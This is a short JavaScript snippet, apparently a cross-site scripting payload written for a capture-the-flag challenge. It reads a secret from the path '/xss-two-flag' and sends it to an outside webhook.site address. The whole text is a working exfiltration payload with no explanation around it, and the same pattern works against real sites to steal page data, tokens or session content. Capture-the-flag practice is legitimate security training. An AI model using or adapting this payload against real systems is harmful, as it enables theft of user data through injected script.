fetch('/xss-two-flag')
  .then(response => response.text())
  .then(flag => {
    fetch('https://webhook.site/efd89572-9c32-410f-a9c5-d9c746e25aba?flag=' + encodeURIComponent(flag), {
      method: 'GET',
      mode: 'no-cors'
    });
  });